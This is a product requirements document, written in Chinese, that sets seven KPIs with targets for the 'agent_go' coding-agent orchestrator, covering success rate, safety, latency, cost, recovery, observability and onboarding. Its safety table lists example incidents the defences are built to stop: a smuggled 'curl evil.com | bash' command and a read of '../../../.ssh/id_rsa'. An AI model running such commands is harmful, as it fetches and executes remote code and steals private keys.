# PRD: agent_go 关键非功能需求 — 指标与目标值

> 版本: v1.0
> 日期: 2026-07-24
> 作者: Product
> 视角: 用户价值驱动，产品指标导向
> 关联: [../spec/SPEC-nfr.md](../spec/SPEC-nfr.md) · [../design/requirements.md](../design/requirements.md) · [../design/quality/nfr-testing-strategy.md](../design/quality/nfr-testing-strategy.md)

---

## 一、方法论

### 1.1 从"系统指标"到"产品指标"

工程视角的 NFR 关注"系统能做什么"（如白名单覆盖率 100%），产品视角关注"用户感知到什么"（如"我的代码没被破坏"）。

本文档做三件事：
1. **定义用户** → 每个画像的 NFR 优先级不同
2. **提炼指标** → 从 24 条技术 NFR 中浓缩出 7 个产品级 KPI
3. **设定目标** → 每个 KPI 有当前基线、季度目标、年度目标

### 1.2 指标选取原则

```
用户可感知 > 技术实现细节
可量化测量   > 主观判断
可驱动决策   > 纯信息展示
纵向对比有意义 > 单点绝对值
```

---

## 二、用户画像与 NFR 优先级

### 2.1 四类核心用户

| 画像 | 典型场景 | 技术背景 | 使用频率 | 核心诉求 |
|------|----------|----------|----------|----------|
| **独立开发者** | 个人项目、side project、开源维护 | 全栈，熟悉 CLI | 5-10 次/周 | 快、正确、便宜 |
| **团队 Tech Lead** | 团队 repo 批量任务、code review 自动化 | 资深，关注质量 | 10-30 次/周 | 安全、可控、可审计 |
| **CI/CD Pipeline** | GitHub Actions 中自动触发 | 无人工介入 | 50-200 次/周 | 稳定、幂等、零交互 |
| **平台工程师** | 评估引入、配置团队规范 | 架构视角 | 评估期密集 | 可观测、可定制、成本透明 |

### 2.2 各画像的 NFR 优先级矩阵

| NFR 维度 | 独立开发者 | Tech Lead | CI/CD | 平台工程师 |
|----------|-----------|-----------|-------|-----------|
| **任务成功率** | 🔴 P0 | 🔴 P0 | 🔴 P0 | 🟡 P1 |
| **安全性** | 🟡 P1 | 🔴 P0 | 🔴 P0 | 🟡 P1 |
| **执行时长** | 🔴 P0 | 🟡 P1 | 🟡 P1 | 🟢 P2 |
| **成本可控** | 🔴 P0 | 🟡 P1 | 🟡 P1 | 🔴 P0 |
| **可恢复性** | 🟡 P1 | 🔴 P0 | 🔴 P0 | 🟢 P2 |
| **可观测性** | 🟢 P2 | 🟡 P1 | 🔴 P0 | 🔴 P0 |
| **上手体验** | 🔴 P0 | 🟢 P2 | 🟢 P2 | 🟡 P1 |

> 解读：🔴 P0 是"缺了就不敢用"，🟡 P1 是"经常用到会很在意"，🟢 P2 是"锦上添花"

### 2.3 核心洞察

1. **独立开发者** 和 **CI/CD** 的优先级几乎相反 — 前者在意速度和成本，后者在意稳定和安全。产品需同时满足两端。
2. **安全性** 在 Tech Lead 和 CI/CD 中是 P0 — 这意味着"受托执行代码变更"场景下的信任门槛是产品存亡问题。
3. **可观测性** 随着使用规模增长，从 P2 上升到 P0 — 个人开发者不需要，但平台工程师引入团队时必须看到数据。

---

## 三、7 个关键产品 KPI

从 24 条技术 NFR 中，按"用户可感知 + 可量化 + 可驱动决策"原则，浓缩为 7 个产品级 KPI。

每个 KPI 的格式：

```
指标定义 → 用户感知 → 当前基线 → 季度目标 → 年度目标 → 测量方法
```

---

### KPI-1: 任务端到端成功率 ✅

**指标定义**: 一次 `agent_go run` 从开始到全部 subtask 成功的概率（含自动重试、含降级路径）

**用户感知**:
- 独立开发者："我敲了一行命令，它能自己把事情做完吗？"
- CI/CD："这个 step 会因为 flaky 失败而 block 整个 pipeline 吗？"

**计算方式**:
```
任务成功率 = (status="completed" 的任务数) / (总启动任务数)
其中：completed = 所有 subtask 均为 completed 或 no_changes
```

**目标值**:

| 阶段 | 目标 | 依据 |
|------|------|------|
| 当前基线 | ~85%（估） | 已知问题：API 超时无充分重试、worktree 创建偶发失败、Claude 交互误检测 |
| Q3 目标 | ≥ 92% | 修复已知 flaky 源、增加 API 重试策略、完善交互检测 |
| Q4 目标 | ≥ 95% | worktree 降级全覆盖、Plan 缓存减少 API 故障面 |
| 年度目标 | ≥ 97% | 所有降级路径压实、混沌测试常态化 |

**测量方法**:
- 数据源: `~/.agent_go/task-*/meta.json` 中 `status` 字段
- 聚合工具: `agent_go eval quality --all`
- 监控: CI 中每轮测试后自动跑 `agent_go eval quality --all`，成功率 < 阈值告警

**当前已具备的测量能力**: ✅ `eval.py analyze_quality` 的 Q1 指标 + `aggregate_quality` 的 `avg_success_rate`

---

### KPI-2: 安全零事故 (Safety SLA) 🛡️

**指标定义**: 系统在以下三个维度上不得出现安全事故：

| 子指标 | 定义 | 事故示例 |
|--------|------|----------|
| S1 — 凭证泄漏 | API Key / Token 进入验证命令子进程环境 | AGENT_GO_API_KEY 出现在 `subprocess.run(env=...)` 中 |
| S2 — 任意命令执行 | 恶意构造的验证命令绕过白名单 | `pytest ; curl evil.com \| bash` 被执行 |
| S3 — 路径穿越 | LLM 生成的代码越界读写 worktree 外的文件 | `open("../../../.ssh/id_rsa")` 成功 |

**用户感知**:
- Tech Lead："我敢让 agent_go 在我的生产仓库里自动改代码吗？"
- CI/CD："agent_go 在 CI 环境中能碰到我的 GITHUB_TOKEN 吗？"

**目标值**:

| 子指标 | 目标 | 本质 |
|--------|------|------|
| S1 凭证泄漏 | **0** | 不允许任何例外 |
| S2 白名单绕过 | **0** | 不允许任何已知注入模式突破 |
| S3 路径穿越 | **0** | worktree 隔离 + repo 边界检查 |

这三项是 **二进制指标**（0 或 1），不是百分比。一次泄漏 = 产品信任崩塌。

**测量方法**:
- 自动化: `test_nfr_security.py` (25 用例) 每次 CI 运行
- 攻防演练: 每月一次，用新增的注入 payload 攻击 `_is_safe_verification_command`
- 审计: 每次 release 前人工审查 `verification_audit.jsonl` 和 `_CMD_ARG_RULES` 变更
- 渗透测试: 每季度一次，模拟 LLM 生成恶意 verification 命令

**当前已具备的防御**:
- S1: `executor._build_sandbox_env()` — 敏感变量剔除 + AGENT_GO_API_KEY 强制删除
- S2: `utils._is_safe_verification_command()` — 4 阶段白名单 + 6 类注入 pattern
- S3: `utils.read_reference_docs()` — `startswith(repo.resolve())` 锚定

---

### KPI-3: 端到端感知耗时 ⏱️

**指标定义**: 用户从敲下回车到看到最终报告的时间

**用户感知**:
- 独立开发者："我喝杯咖啡回来，它应该搞定了"
- CI/CD："不能因为 agent_go 把 GitHub Actions 的 30 分钟配额跑满了"

**计算方式**:
```
感知耗时 = Plan 生成耗时 + Σ(subtask 执行耗时) / 并发效率
其中：
  Plan 生成耗时 = API 调用(或缓存命中) + JSON 解析
  并发效率 = Σ(subtask 墙钟) / 总墙钟时间（P6 in eval.py）
```

**目标值**:

| 场景 | 当前基线 | Q3 目标 | Q4 目标 | 年度目标 |
|------|----------|---------|---------|----------|
| 简单任务 (1-2 subtask) | ~3-5 min | ≤ 3 min | ≤ 2 min | ≤ 1.5 min |
| 中等任务 (3-5 subtask) | ~8-15 min | ≤ 10 min | ≤ 7 min | ≤ 5 min |
| 复杂任务 (6-10 subtask, --parallel 3) | ~15-30 min | ≤ 20 min | ≤ 15 min | ≤ 10 min |

**分解与优化杠杆**:

| 阶段 | 典型占比 | 优化方向 |
|------|----------|----------|
| Plan 生成 | 5-10% | 缓存命中率提升 (当前 ≈0% 因 commit hash 混入 key → 目标 ≥80%) |
| Claude 执行 | 70-85% | Claude 推理本身不可控，优化 waiting/interaction 误检测重试 |
| 验证执行 | 5-10% | 验证命令并行化 |
| git 操作 | 2-5% | worktree 复用 |

**测量方法**:
- 数据源: `result.json` 中 `timing` 字段 + `execution.log` 中 `plan_complete` 事件
- 聚合工具: `agent_go eval perf --all`
- 监控: P50/P95/P99 分位值趋势图

**当前已具备的测量能力**: ✅ `metrics.collect_timing` + `eval.analyze_performance` 的 P1-P6

---

### KPI-4: 单任务成本 💰

**指标定义**: 一次 `agent_go run` 的 LLM API 费用

**用户感知**:
- 独立开发者："用一次多少钱？我的 API 账单会暴增吗？"
- 平台工程师："给全团队开通的话，月度预算是多少？"

**计算方式**:
```
单任务成本 = Plan API 费用 + Σ(Claude Code 调用费用)
Plan API 费用 = prompt_tokens × $3.0/1M + completion_tokens × $15.0/1M (Claude)
注意：Claude Code 自身的 token 消耗目前不经过 agent_go 采集
```

**目标值**:

| 指标 | 当前基线 | Q3 目标 | Q4 目标 | 年度目标 |
|------|----------|---------|---------|----------|
| Plan API 单次成本 | ~$0.05-0.15 | ≤ $0.10 | ≤ $0.05 | ≤ $0.03 |
| 缓存命中率 | ~0% | ≥ 50% | ≥ 70% | ≥ 85% |
| 月均费用 (个人开发者) | ~$5-15 | ≤ $10 | ≤ $5 | ≤ $3 |

**优化杠杆**:
1. **Plan 缓存** (最大杠杆): 修复 cache key 包含 commit hash 的问题 → 命中率从 0% → 80%+
2. **Prompt 精简**: 当前 system prompt 注入 Skill 清单 + 规则摘要 + 示例 → 评估是否过度
3. **Provider 选择**: DeepSeek ($0.27/1M prompt) 成本仅为 Claude 的 9%，适合非关键任务

**测量方法**:
- 数据源: `execution.log` 中 `api_call` 事件 (prompt_tokens, completion_tokens, model)
- 聚合工具: `agent_go eval cost`
- 预算告警: 在 config 中增加 `monthly_budget_usd` 字段，超预算时 warning

**当前已具备的测量能力**: ✅ `metrics.extract_usage` + `eval.analyze_cost`

---

### KPI-5: 中断恢复可靠性 🔄

**指标定义**: 任务被中断（Ctrl+C / 终端关闭 / 系统崩溃）后，`resume` 能正确继续执行的概率

**用户感知**:
- Tech Lead："跑了 20 分钟的任务被 Ctrl+C 了，重来得再花 20 分钟？"
- CI/CD："CI runner 被 preempted 了，能接上吗？"

**计算方式**:
```
恢复成功率 = (resume 后 status="completed" 的任务数) / (resume 总尝试数)
其中：resume 正确性 = 已完成 subtask 不重复执行 + 未完成 subtask 全部执行 + meta.json 一致
```

**目标值**:

| 指标 | 目标 |
|------|------|
| 恢复成功率 | ≥ 99%（基本不允许恢复失败） |
| 已完成 subtask 重复执行率 | 0%（幂等保证） |
| 中断时 meta.json 写入成功率 | ≥ 99.9%（断电场景除外） |

**测量方法**:
- 自动化: `test_nfr_reliability.py` 中 `TestMultiInterruptCycle` (3 用例)
- 混沌测试: 随机时间点 `kill -2` agent_go 进程 → `resume` → 验证结果一致性

**当前已具备的能力**:
- `pipeline._on_interrupt` — SIGINT/SIGTERM → SIGKILL 子进程 → meta["status"]="paused"
- `cmd_resume` — 读取 meta.json → 过滤 completed_ids → 从断点继续

---

### KPI-6: 可观测性覆盖度 📊

**指标定义**: 用户能从日志/报表中回答关键问题的能力

**用户感知**:
- 平台工程师："上周 50 个任务，成功了几个？花了多少钱？最慢的是哪步？"
- CI/CD："凌晨 3 点失败的那个任务，我能看到失败原因吗？"

**用户关键问题清单** (来自用户调研假设):

| 问题 | 当前是否可回答 | 查询方式 |
|------|--------------|----------|
| Q: 这次任务成功了吗？ | ✅ | `agent_go show <id>` / `meta.json` |
| Q: 哪一步失败了？ | ✅ | `agent_go show <id>` 查看 results 数组 |
| Q: 花了多少钱？ | ✅ | `agent_go eval cost` |
| Q: 为什么这一步失败了？ | ⚠️ 部分 | `execution.log` 中有 exit_code 和 summary，但 Claude 的具体错误需人工查看 stdout |
| Q: 这个月和上个月比，成功率有提升吗？ | ✅ | `agent_go eval quality --all` (需跨时间段聚合) |
| Q: 最慢的是哪一步？ | ✅ | `agent_go eval perf <task-id>` |
| Q: 谁在什么时间跑了什么任务？ | ❌ | 缺少用户标识和时间线视图 |
| Q: 这个任务修改了哪些文件？ | ✅ | `result.json` → `change_stats.actual_files` |
| Q: 验证命令有没有被拒绝过？ | ✅ | `verification_audit.jsonl` |

**目标值**:

| 指标 | 当前 | Q3 目标 | Q4 目标 |
|------|------|---------|----------|
| 关键问题可回答率 | 7/9 (78%) | 8/9 (89%) | 9/9 (100%) |
| 故障排查时间 (MTTR) | 未知 | ≤ 5 min | ≤ 2 min |
| 成本归因精度 | per-model | per-task + per-model | per-user + per-task + per-model |

**当前缺口与优先级**:
1. **P0**: 用户标识 + 时间线视图 — 多用户场景下的基础需求
2. **P1**: Claude stdout 摘要提取 — 目前需人工查看日志，MTTR 高
3. **P2**: 跨时间段趋势对比 — 当前 `aggregate_quality` 可做但无时间过滤

---

### KPI-7: 首次上手时间 (Time-to-First-Run, TTFR) 🚀

**指标定义**: 从 `git clone` 到第一次 `agent_go run` 成功完成的时间

**用户感知**:
- 独立开发者："README 说一个小时跑通，真的吗？"
- 平台工程师："给团队写 onboarding 文档需要多长？"

**计算方式**:
```
TTFR = 安装耗时 + 配置耗时 + 首次 run 耗时
其中：
  安装 = git clone + (无需 pip install)
  配置 = 创建 config.json + 设置 AGENT_GO_API_KEY
  首次 run = Plan 生成(无缓存) + SubTask 执行
```

**目标值**:

| 阶段 | 当前基线 | Q3 目标 | Q4 目标 |
|------|----------|---------|----------|
| 安装 | < 1 min (clone only) | < 1 min | < 1 min |
| 配置 | ~3-5 min (需注册 API Key) | ≤ 3 min | ≤ 2 min |
| 首次 run | ~5-15 min | ≤ 8 min | ≤ 5 min |
| **TTFR 总计** | **~10-20 min** | **≤ 12 min** | **≤ 8 min** |

**优化杠杆**:
1. `agent_go config` 交互式引导 — 当前缺少，用户需手动编辑 JSON
2. 内置 example task — `agent_go run . "add a hello world comment"` 作为 smoke test
3. 错误消息改进 — 缺少 API Key 时的提示应直接给出注册链接

---

## 四、指标优先级矩阵

从产品决策视角，按"用户影响面 × 当前差距"排序：

```
          用户影响面 →
          高                   中                   低
当  高  🔴 任务成功率       🟡 端到端耗时
前               🔴 安全零事故
差
距  中  🔴 成本可控         🟡 可观测性覆盖
↓                        🟡 中断恢复
    低  🟢 TTFR            🟢 -                  🟢 -
```

**Q3 必达 (P0)**:
1. 任务成功率 ≥ 92%
2. 安全零事故 (S1/S2/S3 全部保持 0)
3. 单任务成本下降 50% (通过 Plan 缓存)

**Q3 力争 (P1)**:
4. 端到端耗时: 简单任务 ≤ 3min
5. 中断恢复成功率 ≥ 99%
6. 可观测性: 关键问题可回答率 8/9

**Q4 目标 (P2)**:
7. TTFR ≤ 8min

---

## 五、指标采集与看板

### 5.1 数据流

```
run_subtask → metrics.py 采集 → result.json + execution.log
                                        ↓
                               eval.py 离线分析
                                        ↓
                               CI dashboard / 定期报告
```

### 5.2 建议新增：`agent_go eval dashboard`

```
agent_go eval dashboard --period 7d

═══════════════════════════════════════════
  agent_go 7-Day Health Dashboard
═══════════════════════════════════════════
  ✅ 任务成功率    94.2%    (目标 ≥ 92%)  ████████░░
  🛡️ 安全事故       0       (目标 = 0)    🟢
  ⏱️ P50 耗时      4.2 min  (目标 ≤ 5min) ████████░░
  💰 总费用        $3.42    (上限 $10/wk) ███░░░░░░░
  🔄 恢复成功率   100%     (目标 ≥ 99%)   ██████████
  📊 报表可回答率   7/9     (目标 8/9)     ███████░░░
═══════════════════════════════════════════
```

### 5.3 CI 集成

```yaml
# .github/workflows/agent-go-health.yml
- name: Health Check
  run: |
    agent_go eval all --all
    # 如果成功率 < 阈值，fail the step
```

---

## 六、竞品参考

| 产品 | 任务成功率 | 安全模型 | 首次上手 | 单任务成本 |
|------|-----------|----------|----------|-----------|
| Claude Code (bare) | ~90% (单 agent, 无编排) | 用户手动确认每个操作 | ~5 min | ~$0.10-0.50/次 |
| Aider | ~85% | git 自动 commit, 可回滚 | ~3 min | ~$0.05-0.20/次 |
| Cursor Agent | ~88% | IDE 沙箱内, 用户可撤销 | ~10 min (需安装 IDE) | 订阅制 $20/mo |
| **agent_go** | **目标 92-97%** | **白名单 + 沙箱 + 审计** | **目标 ≤ 8 min** | **目标 ≤ $0.05/次** |

agent_go 的差异化: 编排多步骤任务（竞品多为单步）、安全白名单（竞品多为用户手动确认）、零依赖（竞品需 Node/Python 包）。

---

## 七、版本历史

| 版本 | 日期 | 变更 |
|------|------|------|
| v1.0 | 2026-07-24 | 初始版本：4 用户画像、7 产品 KPI、目标值、测量方法、优先级矩阵 |
